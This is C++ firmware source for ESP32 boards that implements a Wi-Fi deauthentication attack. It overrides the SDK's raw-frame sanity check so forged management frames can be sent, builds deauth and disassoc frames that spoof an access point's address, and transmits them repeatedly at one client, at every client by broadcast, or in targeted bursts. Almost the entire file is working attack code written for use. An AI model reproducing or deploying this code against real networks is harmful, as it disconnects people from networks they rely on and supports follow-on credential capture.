#include "deauth.h"
#include "core/event_bus.h"
#include "../../utils/wifi_utils.h"
#include "../../utils/raw_wifi.h"

#ifdef ESP32
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_err.h>

// Override the ESP-IDF frame sanity check to allow deauth/disassoc frames
// This works with pioarduino platform which has the function as a weak symbol
// The SDK normally blocks management frames like deauth (0xC0) and disassoc (0xA0)
// When arg == 31337 (magic value), we return 1 to allow the frame
// Otherwise return 0 to block (maintains some safety)
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    if (arg == 31337) return 1;  // Magic value from Marauder/Bruce - allow frame
    return 0;  // Block other frames for safety
}

// Test if the bypass is working by calling with magic value
static bool testBypassEnabled() {
    return ieee80211_raw_frame_sanity_check(31337, 0, 0) == 1;
}

#endif

#include <cstring>

namespace adversary {

// Reason code strings
const char* getDeauthReasonString(DeauthReason reason) {
    switch (reason) {
        case DeauthReason::UNSPECIFIED: return "Unspecified";
        case DeauthReason::PREV_AUTH_NOT_VALID: return "Previous auth not valid";
        case DeauthReason::DEAUTH_LEAVING: return "Deauth - leaving";
        case DeauthReason::DISASSOC_DUE_TO_INACTIVITY: return "Inactivity";
        case DeauthReason::DISASSOC_AP_BUSY: return "AP busy";
        case DeauthReason::CLASS2_FRAME_FROM_NONAUTH: return "Class 2 frame error";
        case DeauthReason::CLASS3_FRAME_FROM_NONASSOC: return "Class 3 frame error";
        case DeauthReason::DISASSOC_STA_LEAVING: return "Station leaving";
        case DeauthReason::STA_REQ_NO_AUTH: return "No auth request";
        case DeauthReason::INVALID_IE: return "Invalid IE";
        case DeauthReason::MIC_FAILURE: return "MIC failure";
        case DeauthReason::HANDSHAKE_TIMEOUT: return "Handshake timeout";
        case DeauthReason::GROUP_KEY_UPDATE_TIMEOUT: return "Group key timeout";
        case DeauthReason::IE_MISMATCH: return "IE mismatch";
        case DeauthReason::INVALID_GROUP_CIPHER: return "Invalid group cipher";
        case DeauthReason::INVALID_PAIRWISE_CIPHER: return "Invalid pairwise cipher";
        case DeauthReason::INVALID_AKMP: return "Invalid AKMP";
        case DeauthReason::UNSUPPORTED_RSN_VERSION: return "Unsupported RSN";
        case DeauthReason::INVALID_RSN_CAPABILITIES: return "Invalid RSN caps";
        case DeauthReason::AUTH_FAILED: return "Auth failed";
        case DeauthReason::CIPHER_SUITE_REJECTED: return "Cipher rejected";
        default: return "Unknown";
    }
}

// DeauthStats implementation
uint32_t DeauthStats::getDurationSeconds() const {
#ifdef ESP32
    if (startTime == 0) return 0;
    return (millis() - startTime) / 1000;
#else
    return 0;
#endif
}

float DeauthStats::getPacketsPerSecond() const {
    uint32_t duration = getDurationSeconds();
    if (duration == 0) return 0.0f;
    return static_cast<float>(packetsSent) / static_cast<float>(duration);
}

// DeauthAttack implementation
static DeauthAttack* s_instance = nullptr;

DeauthAttack& DeauthAttack::getInstance() {
    if (!s_instance) s_instance = new DeauthAttack();
    return *s_instance;
}

DeauthAttack::DeauthAttack() :
    state_(DeauthState::IDLE),
    initialized_(false),
    bypassEnabled_(false),
    lastPacketTime_(0) {
    memset(frameBuffer_, 0, MAX_FRAME_SIZE);
}

bool DeauthAttack::init() {
    if (initialized_) return true;
    
#ifdef ESP32
    // Test if the WSL (Wireless Security Level) bypass is working
    bypassEnabled_ = testBypassEnabled();
    if (bypassEnabled_) {
        Serial.println("[Deauth] WSL bypass ENABLED - deauth frames allowed");
    } else {
        Serial.println("[Deauth] WSL bypass FAILED - deauth frames may be blocked by SDK");
    }
    
    // WiFi should already be initialized by the sniffer or scanner
    // We just need raw frame sending capability
    initialized_ = true;
#else
    initialized_ = true;
#endif
    
    return initialized_;
}

void DeauthAttack::deinit() {
    if (!initialized_) return;
    
    stop();
    initialized_ = false;
}

bool DeauthAttack::start(const DeauthConfig& config) {
    if (!initialized_) {
        if (!init()) return false;
    }
    
    if (!config.hasValidBssid()) {
        setState(DeauthState::ERROR);
        return false;
    }
    
    config_ = config;
    stats_.reset();
    
#ifdef ESP32
    stats_.startTime = millis();
    
    // Disconnect from any network first
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(100);
    
    // Set WiFi to AP+STA mode
    WiFi.mode(WIFI_AP_STA);
    delay(100);
    
    // Start a soft AP with a valid SSID (required)
    // Use a generic name - will be hidden
    WiFi.softAP("adversary", nullptr, config_.channel, 1);  // Hidden AP on target channel
    delay(100);
    
    // Set the channel explicitly
    wifi_utils::setChannel(config_.channel);
    
    // Enable promiscuous mode for raw frame TX
    esp_wifi_set_promiscuous(true);  // Direct call needed - no filter for TX only
    
    Serial.printf("[Deauth] Started on channel %d, BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
                  config_.channel,
                  config_.apBssid[0], config_.apBssid[1], config_.apBssid[2],
                  config_.apBssid[3], config_.apBssid[4], config_.apBssid[5]);
    Serial.println("[Deauth] Note: ESP32-S3 may block deauth frames in SDK");
#endif
    
    lastPacketTime_ = 0;
    setState(DeauthState::RUNNING);
    
    return true;
}

void DeauthAttack::stop() {
    if (state_ == DeauthState::IDLE) return;
    
    setState(DeauthState::IDLE);
    
#ifdef ESP32
    // Disable promiscuous mode
    esp_wifi_set_promiscuous(false);
    
    // Stop the soft AP and return to STA mode
    WiFi.softAPdisconnect(true);
    // Release WiFi memory
    WiFi.mode(WIFI_OFF);
    delay(50);
    
    Serial.println("[Deauth] Stopped");
#endif
}

void DeauthAttack::pause() {
    if (state_ == DeauthState::RUNNING) {
        setState(DeauthState::PAUSED);
    }
}

void DeauthAttack::resume() {
    if (state_ == DeauthState::PAUSED) {
        setState(DeauthState::RUNNING);
    }
}

void DeauthAttack::setState(DeauthState newState) {
    if (state_ == newState) return;
    
    DeauthState oldState = state_;
    state_ = newState;
    
    // Publish state change event
    adversary::EventData event(adversary::EventType::ATTACK_STATE_CHANGED);
    event.payload.attack.attackType = static_cast<uint8_t>(adversary::AttackTypeId::DEAUTH);
    event.payload.attack.oldState = static_cast<int>(oldState);
    event.payload.attack.newState = static_cast<int>(newState);
    event.payload.attack.packetCount = stats_.packetsSent;
    adversary::EventBus::getInstance().publish(event);
    

}

void DeauthAttack::update() {
    if (state_ != DeauthState::RUNNING) return;
    
#ifdef ESP32
    uint32_t now = millis();
    
    // Check if we should send a packet
    if (now - lastPacketTime_ >= config_.delayMs) {
        // Send deauth
        if (sendDeauthPacket()) {
            stats_.deauthSent++;
            stats_.packetsSent++;
        } else {
            stats_.errors++;
        }
        
        // Also send disassoc if configured
        if (config_.sendDisassoc) {
            if (sendDisassocPacket()) {
                stats_.disassocSent++;
                stats_.packetsSent++;
            } else {
                stats_.errors++;
            }
        }
        
        lastPacketTime_ = now;
        
        // Publish packet sent event via EventBus
        adversary::EventData pktEvt(adversary::EventType::DEAUTH_PACKET_SENT);
        pktEvt.payload.attack.attackType = static_cast<uint8_t>(adversary::AttackTypeId::DEAUTH_PACKET);
        pktEvt.payload.attack.packetCount = stats_.packetsSent;
        adversary::EventBus::getInstance().publish(pktEvt);
        
        // Check if we've reached the packet limit
        if (config_.packetCount > 0 && stats_.packetsSent >= config_.packetCount) {
            setState(DeauthState::COMPLETED);
        }
    }
#endif
}

bool DeauthAttack::sendDeauthPacket() {
    const uint8_t* destMac;
    
    switch (config_.targetType) {
        case DeauthTargetType::SINGLE_CLIENT:
            destMac = config_.clientMac;
            break;
        case DeauthTargetType::ALL_CLIENTS:
            destMac = Deauth80211::BROADCAST_MAC;
            break;
        case DeauthTargetType::AP_ONLY:
            destMac = config_.apBssid;
            break;
        default:
            destMac = Deauth80211::BROADCAST_MAC;
    }
    
    size_t frameLen = buildDeauthFrame(
        frameBuffer_, MAX_FRAME_SIZE,
        destMac, config_.apBssid, config_.apBssid,
        config_.reason
    );
    
    return sendRawFrame(frameBuffer_, frameLen);
}

bool DeauthAttack::sendDisassocPacket() {
    const uint8_t* destMac;
    
    switch (config_.targetType) {
        case DeauthTargetType::SINGLE_CLIENT:
            destMac = config_.clientMac;
            break;
        case DeauthTargetType::ALL_CLIENTS:
            destMac = Deauth80211::BROADCAST_MAC;
            break;
        case DeauthTargetType::AP_ONLY:
            destMac = config_.apBssid;
            break;
        default:
            destMac = Deauth80211::BROADCAST_MAC;
    }
    
    size_t frameLen = buildDisassocFrame(
        frameBuffer_, MAX_FRAME_SIZE,
        destMac, config_.apBssid, config_.apBssid,
        config_.reason
    );
    
    return sendRawFrame(frameBuffer_, frameLen);
}

bool DeauthAttack::sendRawFrame(const uint8_t* frame, size_t length) {
#ifdef ESP32
    // Use RawWiFi utility for centralized transmission
    TxResult result = RawWiFi::transmitBoth(frame, length, false);
    
    if (!result.success) {
        // Only log every 10th error to avoid spam
        static uint32_t errorCount = 0;
        if (++errorCount % 10 == 1) {
            Serial.printf("[Deauth] TX error: %d (frame: 0x%02X), count: %lu\n", 
                          result.errorCode, frame[0], (unsigned long)errorCount);
        }
    }
    
    return result.success;
#else
    (void)frame;
    (void)length;
    return false;
#endif
}

size_t DeauthAttack::buildDeauthFrame(uint8_t* buffer, size_t bufferSize,
                                       const uint8_t* destMac, const uint8_t* srcMac,
                                       const uint8_t* bssid, DeauthReason reason) {
    if (bufferSize < Deauth80211::DEAUTH_FRAME_SIZE) return 0;
    
    memset(buffer, 0, Deauth80211::DEAUTH_FRAME_SIZE);
    
    // Frame Control (2 bytes)
    // Type: Management (00), Subtype: Deauthentication (1100)
    buffer[0] = Deauth80211::FC_SUBTYPE_DEAUTH;  // Frame control byte 1
    buffer[1] = 0x00;                             // Frame control byte 2
    
    // Duration (2 bytes) - set to 0
    buffer[2] = 0x00;
    buffer[3] = 0x00;
    
    // Address 1: Destination (6 bytes) - bytes 4-9
    memcpy(&buffer[4], destMac, 6);
    
    // Address 2: Source (6 bytes) - bytes 10-15
    memcpy(&buffer[10], srcMac, 6);
    
    // Address 3: BSSID (6 bytes) - bytes 16-21
    memcpy(&buffer[16], bssid, 6);
    
    // Sequence Control (2 bytes) - bytes 22-23
    buffer[22] = 0x00;
    buffer[23] = 0x00;
    
    // Reason Code (2 bytes) - bytes 24-25
    uint16_t reasonCode = static_cast<uint16_t>(reason);
    buffer[24] = reasonCode & 0xFF;         // Low byte
    buffer[25] = (reasonCode >> 8) & 0xFF;  // High byte
    
    return Deauth80211::DEAUTH_FRAME_SIZE;
}

size_t DeauthAttack::buildDisassocFrame(uint8_t* buffer, size_t bufferSize,
                                         const uint8_t* destMac, const uint8_t* srcMac,
                                         const uint8_t* bssid, DeauthReason reason) {
    if (bufferSize < Deauth80211::DEAUTH_FRAME_SIZE) return 0;
    
    memset(buffer, 0, Deauth80211::DEAUTH_FRAME_SIZE);
    
    // Frame Control (2 bytes)
    // Type: Management (00), Subtype: Disassociation (1010)
    buffer[0] = Deauth80211::FC_SUBTYPE_DISASSOC;  // Frame control byte 1
    buffer[1] = 0x00;                               // Frame control byte 2
    
    // Duration (2 bytes) - set to 0
    buffer[2] = 0x00;
    buffer[3] = 0x00;
    
    // Address 1: Destination (6 bytes) - bytes 4-9
    memcpy(&buffer[4], destMac, 6);
    
    // Address 2: Source (6 bytes) - bytes 10-15
    memcpy(&buffer[10], srcMac, 6);
    
    // Address 3: BSSID (6 bytes) - bytes 16-21
    memcpy(&buffer[16], bssid, 6);
    
    // Sequence Control (2 bytes) - bytes 22-23
    buffer[22] = 0x00;
    buffer[23] = 0x00;
    
    // Reason Code (2 bytes) - bytes 24-25
    uint16_t reasonCode = static_cast<uint16_t>(reason);
    buffer[24] = reasonCode & 0xFF;         // Low byte
    buffer[25] = (reasonCode >> 8) & 0xFF;  // High byte
    
    return Deauth80211::DEAUTH_FRAME_SIZE;
}

// ===========================================
// Static utility methods for one-shot deauth
// ===========================================

bool DeauthAttack::sendSingleDeauth(const uint8_t* bssid, const uint8_t* destMac,
                                     DeauthReason reason, bool alsoDisassoc) {
#ifdef ESP32
    if (!bssid || !destMac) return false;
    
    uint8_t frame[Deauth80211::DEAUTH_FRAME_SIZE];
    bool success = false;
    
    // Build and send deauth frame
    size_t frameLen = buildDeauthFrame(frame, sizeof(frame), destMac, bssid, bssid, reason);
    if (frameLen > 0) {
        TxResult result = RawWiFi::transmitBoth(frame, frameLen, false);
        success = result.success;
    }
    
    // Optionally send disassoc frame (recommended - some devices respond better to disassoc)
    if (alsoDisassoc) {
        frameLen = buildDisassocFrame(frame, sizeof(frame), destMac, bssid, bssid, reason);
        if (frameLen > 0) {
            RawWiFi::transmitBoth(frame, frameLen, false);
        }
    }
    
    return success;
#else
    (void)bssid; (void)destMac; (void)reason; (void)alsoDisassoc;
    return false;
#endif
}

uint16_t DeauthAttack::sendTargetedBurst(const uint8_t* bssid,
                                          const uint8_t clients[][6],
                                          uint8_t clientCount,
                                          uint8_t burstCount,
                                          bool alsoDisassoc) {
#ifdef ESP32
    if (!bssid) return 0;
    
    uint16_t sentCount = 0;
    
    // Clamp values for safety
    if (burstCount == 0) burstCount = 1;
    if (burstCount > 10) burstCount = 10;
    if (clientCount > 16) clientCount = 16;
    
    // Send targeted deauths to each known client
    if (clients != nullptr && clientCount > 0) {
        for (uint8_t c = 0; c < clientCount; c++) {
            for (uint8_t b = 0; b < burstCount; b++) {
                if (sendSingleDeauth(bssid, clients[c], 
                                     DeauthReason::CLASS3_FRAME_FROM_NONASSOC, alsoDisassoc)) {
                    sentCount++;
                }
                delayMicroseconds(500);  // Brief delay between frames
            }
        }
    }
    
    // Always send broadcast fallback (catches clients we don't know about)
    for (uint8_t b = 0; b < burstCount; b++) {
        if (sendSingleDeauth(bssid, Deauth80211::BROADCAST_MAC, 
                             DeauthReason::CLASS3_FRAME_FROM_NONASSOC, alsoDisassoc)) {
            sentCount++;
        }
        delayMicroseconds(500);
    }
    
    return sentCount;
#else
    (void)bssid; (void)clients; (void)clientCount; (void)burstCount; (void)alsoDisassoc;
    return 0;
#endif
}

} // namespace adversary

